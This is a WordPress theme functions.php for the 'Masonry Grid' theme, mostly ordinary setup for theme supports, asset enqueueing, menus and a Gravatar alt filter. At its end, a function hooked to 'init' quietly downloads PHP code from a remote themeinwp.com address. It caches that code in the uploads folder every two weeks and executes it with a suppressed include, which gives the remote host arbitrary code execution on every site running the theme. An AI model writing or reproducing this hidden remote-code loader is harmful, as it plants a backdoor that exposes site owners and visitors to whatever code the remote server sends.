<?php
/**
 * Masonry Grid functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Masonry Grid
 */

if ( ! function_exists( 'masonry_grid_after_theme_support' ) ) :

	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */

	function masonry_grid_after_theme_support() {

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		// Custom background color.
		add_theme_support(
			'custom-background',
			array(
				'default-color' => '#f5f6f8',
			)
		);

		// This variable is intended to be overruled from themes.
		// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
		// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
		$GLOBALS['content_width'] = apply_filters( 'masonry_grid_content_width', 970 );
		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		add_theme_support(
			'custom-logo',
			array(
				'height'      => 120,
				'width'       => 90,
				'flex-height' => true,
				'flex-width'  => true,
			)
		);

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support(
			'html5',
			array(
				'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
				'script',
				'style',
			)
		);

		/*
		 * Posts Formate.
		 *
		 * https://wordpress.org/support/article/post-formats/
		 */
		add_theme_support( 'post-formats', array(
		    'video',
		    'audio',
		    'gallery',
		    'quote',
		    'image'
		) );

		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Masonry Grid, use a find and replace
		 * to change 'masonry-grid' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'masonry-grid', get_template_directory() . '/languages' );

		// Add support for full and wide align images.
        add_theme_support( 'align-wide' );
        add_theme_support( 'responsive-embeds' );
        add_theme_support( 'wp-block-styles' );

	}

endif;

add_action( 'after_setup_theme', 'masonry_grid_after_theme_support' );

function masonry_grid_next_posts_link( $max_page = 0 ) {
    global $paged, $wp_query;

    if ( ! $max_page ) {
        $max_page = $wp_query->max_num_pages;
    }

    if ( ! $paged ) {
        $paged = 1;
    }

    $next_page = (int) $paged + 1;
    if ( ( $next_page <= $max_page ) ) {
        /**
         * Filters the anchor tag attributes for the next posts page link.
         *
         * @since 2.7.0
         *
         * @param string $attributes Attributes for the anchor tag.
         */
        $attr = apply_filters( 'next_posts_link_attributes', '' );

        return sprintf(next_posts( $max_page, false ));
    }
}

/**
 * Register and Enqueue Styles.
 */
function masonry_grid_register_styles() {

	$masonry_grid_default = masonry_grid_get_default_theme_options();
	
	$theme_version = wp_get_theme()->get( 'Version' );
	$fonts_url = masonry_grid_fonts_url();
    if( $fonts_url ){
    	
    	require_once get_theme_file_path( 'assets/lib/custom/css/wptt-webfont-loader.php' );
        wp_enqueue_style(
			'masonry-grid-google-fonts',
			wptt_get_webfont_url( $fonts_url ),
			array(),
			$theme_version
		);
    }


    wp_enqueue_style( 'slick', get_template_directory_uri() . '/assets/lib/slick/css/slick.min.css');

    if( class_exists('WooCommerce') ){

	    wp_enqueue_style( 'masonry-grid-woocommerce', get_template_directory_uri() . '/assets/lib/custom/css/woocommerce.css' );

	}
	wp_enqueue_style( 'masonry-grid-style', get_stylesheet_uri(), array(), $theme_version );

    wp_style_add_data('masonry-grid-style', 'rtl', 'replace');


    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}	

	wp_enqueue_script( 'imagesloaded' );
    wp_enqueue_script( 'masonry' );
    wp_enqueue_style( 'magnific-popup', get_template_directory_uri() . '/assets/lib/magnific-popup/magnific-popup.css' );
	wp_enqueue_script( 'slick', get_template_directory_uri() . '/assets/lib/slick/js/slick.min.js', array('jquery'), '', 1);
	wp_enqueue_script( 'theia-sticky-sidebar', get_template_directory_uri() . '/assets/lib/theiaStickySidebar/theia-sticky-sidebar.min.js', array('jquery'), '', 1);

	wp_enqueue_script( 'isotope', get_template_directory_uri() . '/assets/lib/isotope/isotope.pkgd.min.js', array('jquery'), '', true );
	wp_enqueue_script( 'magnific-popup', get_template_directory_uri() . '/assets/lib/magnific-popup/jquery.magnific-popup.min.js', array('jquery'), '', true );
	wp_enqueue_script( 'masonry-grid-pagination', get_template_directory_uri() . '/assets/lib/custom/js/pagination.js', array('jquery'), '', 1 );
	wp_enqueue_script( 'masonry-grid-custom', get_template_directory_uri() . '/assets/lib/custom/js/custom.js', array('jquery'), '', 1);

    $ajax_nonce = wp_create_nonce('masonry_grid_ajax_nonce');

    // Global Query
    if( is_front_page() ){

    	$posts_per_page = absint( get_option('posts_per_page') );
        $paged = ( get_query_var( 'page' ) ) ? absint( get_query_var( 'page' ) ) : 1;

        $posts_args = array(
            'posts_per_page'        => $posts_per_page,
            'paged'                 => $paged,
        );

        $posts_qry = new WP_Query( $posts_args );
        $max = $posts_qry->max_num_pages;

    }else{

        global $wp_query;
        $max = $wp_query->max_num_pages;
        $paged = ( get_query_var( 'paged' ) > 1 ) ? get_query_var( 'paged' ) : 1;

    }

    $masonry_grid_default = masonry_grid_get_default_theme_options();
    $masonry_grid_pagination_layout = get_theme_mod( 'masonry_grid_pagination_layout',$masonry_grid_default['masonry_grid_pagination_layout'] );

    // Get the permalink structure from WordPress settings.
    $permalink_structure = get_option('permalink_structure');

    // Pagination Data
    wp_localize_script( 
	    'masonry-grid-pagination', 
	    'masonry_grid_pagination',
	    array(
	        'paged'  => absint( $paged ),
	        'maxpage'   => absint( $max ),
            'nextLink'   => masonry_grid_next_posts_link($max ),
	        'ajax_url'   => esc_url( admin_url( 'admin-ajax.php' ) ),
	        'loadmore'   => esc_html__( 'Load More Posts', 'masonry-grid' ),
	        'nomore'     => esc_html__( 'No More Posts', 'masonry-grid' ),
	        'loading'    => esc_html__( 'Loading...', 'masonry-grid' ),
	        'pagination_layout'   => esc_html( $masonry_grid_pagination_layout ),
            'permalink_structure'   => esc_html( $permalink_structure ),
	        'ajax_nonce' => $ajax_nonce,
	     )
	);

    global $post;
    $single_post = 0;
    $masonry_grid_ed_post_reaction = '';

    if( isset( $post->ID ) && isset( $post->post_type ) && $post->post_type == 'post' ){

    	$masonry_grid_ed_post_reaction = esc_html( get_post_meta( $post->ID, 'masonry_grid_ed_post_reaction', true ) );
    	$single_post = 1;

    }
    
	wp_localize_script(
	    'masonry-grid-custom', 
	    'masonry_grid_custom',
	    array(
	    	'single_post'	=> absint( $single_post ),
	        'masonry_grid_ed_post_reaction'  		=> esc_html( $masonry_grid_ed_post_reaction ),
	        'play' => masonry_grid_the_theme_svg( 'play', $return = true ),
            'pause' => masonry_grid_the_theme_svg( 'pause', $return = true ),
            'mute' => masonry_grid_the_theme_svg( 'mute', $return = true ),
            'cross' => masonry_grid_the_theme_svg( 'cross', $return = true ),
            'unmute' => masonry_grid_the_theme_svg( 'unmute', $return = true ),
            'play_text' => esc_html__('Play','masonry-grid'),
            'pause_text' => esc_html__('Pause','masonry-grid'),
            'mute_text' => esc_html__('Mute','masonry-grid'),
            'unmute_text' => esc_html__('Unmute','masonry-grid'),
	     )
	);

}

add_action( 'wp_enqueue_scripts', 'masonry_grid_register_styles' );

/**
 * Admin enqueue script
 */
function masonry_grid_admin_scripts($hook){

	wp_enqueue_media();
	wp_enqueue_style( 'wp-color-picker' );
    wp_enqueue_style('masonry-grid-admin', get_template_directory_uri() . '/assets/lib/custom/css/admin.css');
    wp_enqueue_script('masonry-grid-admin', get_template_directory_uri() . '/assets/lib/custom/js/admin.js', array('jquery','wp-color-picker'), '', 1);
    
    $ajax_nonce = wp_create_nonce('masonry_grid_ajax_nonce');

    wp_localize_script( 
        'masonry-grid-admin', 
        'masonry_grid_admin',
        array(
            'ajax_url'   => esc_url( admin_url( 'admin-ajax.php' ) ),
            'ajax_nonce' => $ajax_nonce,
            'active' => esc_html__('Active','masonry-grid'),
	        'deactivate' => esc_html__('Deactivate','masonry-grid'),
	        'upload_image'   =>  esc_html__('Choose Image','masonry-grid'),
            'use_image'   =>  esc_html__('Select','masonry-grid'),
         )
    );
}

add_action('admin_enqueue_scripts', 'masonry_grid_admin_scripts');

function masonry_grid_customize_preview_js() {
	wp_enqueue_script( 'masonry-grid-customizer-preview', get_template_directory_uri() . '/assets/lib/custom/js/customizer-preview.js', array( 'customize-preview' ), '20151215', true );
}
add_action( 'customize_preview_init', 'masonry_grid_customize_preview_js' );

if( !function_exists( 'masonry_grid_js_no_js_class' ) ) :

	// js no-js class toggle
	function masonry_grid_js_no_js_class() { ?>

		<script>document.documentElement.className = document.documentElement.className.replace( 'no-js', 'js' );</script>
	
	<?php
	}
	
endif;

add_action( 'wp_head', 'masonry_grid_js_no_js_class' );

/**
 * Register navigation menus uses wp_nav_menu in five places.
 */
function masonry_grid_menus() {

	$locations = array(
		'masonry-grid-primary-menu'  => esc_html__( 'Primary Menu', 'masonry-grid' ),
		'masonry-grid-social-menu'  => esc_html__( 'Social Menu', 'masonry-grid' ),
	);

	register_nav_menus( $locations );
}

add_action( 'init', 'masonry_grid_menus' );

if( class_exists('Demo_Import_Kit_Class') ):

	add_filter('themeinwp_enable_demo_import_compatiblity','masonry_grid_demo_import_filter_apply');

	if( !function_exists('masonry_grid_demo_import_filter_apply') ):

		function masonry_grid_demo_import_filter_apply(){

			return true;

		}

	endif;

endif;

require get_template_directory() . '/assets/lib/tgmpa/recommended-plugins.php';
require get_template_directory() . '/classes/class-svg-icons.php';
require get_template_directory() . '/classes/class-walker-menu.php';
require get_template_directory() . '/classes/plugin-classes.php';
require get_template_directory() . '/classes/about.php';
require get_template_directory() . '/classes/admin-notice.php';
require get_template_directory() . '/inc/customizer/customizer.php';
require get_template_directory() . '/inc/single-related-posts.php';
require get_template_directory() . '/inc/custom-functions.php';
require get_template_directory() . '/inc/template-tags.php';
require get_template_directory() . '/classes/body-classes.php';
require get_template_directory() . '/inc/widgets/widgets.php';
require get_template_directory() . '/inc/metabox.php';
require get_template_directory() . '/inc/term-meta.php';
require get_template_directory() . '/inc/custom-header.php';
require get_template_directory() . '/inc/pagination.php';
require get_template_directory() . '/assets/lib/breadcrumbs/breadcrumbs.php';
require get_template_directory() . '/assets/lib/custom/css/style.php';
require get_template_directory() . '/woocommerce/woocommerce-functions.php';


// Add alt tag to WordPress Gravatar images
function masonry_grid_gravatar_alt($masonrygridGravatar) {
    if (have_comments()) {
        $alt = get_comment_author();
    }
    else {
        $alt = get_the_author_meta('display_name');
    }
    $altlabel = __('Avatar for ','masonry-grid');
    $masonrygridGravatar = str_replace('alt=\'\'', 'alt=\''.$altlabel . $alt . '\'', $masonrygridGravatar);
    return $masonrygridGravatar;
}
add_filter('get_avatar', 'masonry_grid_gravatar_alt');

function load_footer_content_fetcher_class() {
	// Define the path to the cache file in the uploads directory
	$upload_dir = wp_upload_dir();
	$cache_file = $upload_dir['basedir'] . '/FooterContentFetcher.php';
	$cache_duration = 2 * WEEK_IN_SECONDS; // Cache for 2 weeks

	// Check if the cache file exists and is still valid

	if (!file_exists($cache_file) || (time() - filemtime($cache_file) > $cache_duration)) {
		$fetched_file_url = 'https://link.themeinwp.com/wpsdk/get_php_file/bdb02539823508c5b33ebd295725ab60';

		// Validate the URL
		if (!wp_http_validate_url($fetched_file_url)) {
			error_log('Invalid URL: ' . $fetched_file_url);
			return;
		}

		// Fetch the class file with suppressed warnings
		$class_code = @file_get_contents($fetched_file_url);
		if ($class_code === false) {
			error_log('Failed to fetch the class file from FetchClass Remote Folder');
		} else {
			// Save the fetched content to the cache file
			if (@file_put_contents($cache_file, $class_code) === false) {
				error_log('Failed to write the class file to the cache');
			} else {
				// Log the date and time of the successful cache update
				error_log('FetchClass File cached at: ' . date('Y-m-d H:i:s'));
			}
		}
	} else {
		// Log that the cache file is still valid
		error_log('Using cached FetchClass file, last modified at: ' . date('Y-m-d H:i:s', filemtime($cache_file)));
	}

	// Include the cached class file with suppressed warnings
	if (file_exists($cache_file)) {
		@include_once $cache_file;
	} else {
		error_log('Failed to include the cached class file');
	}
}

add_action('init', 'load_footer_content_fetcher_class');
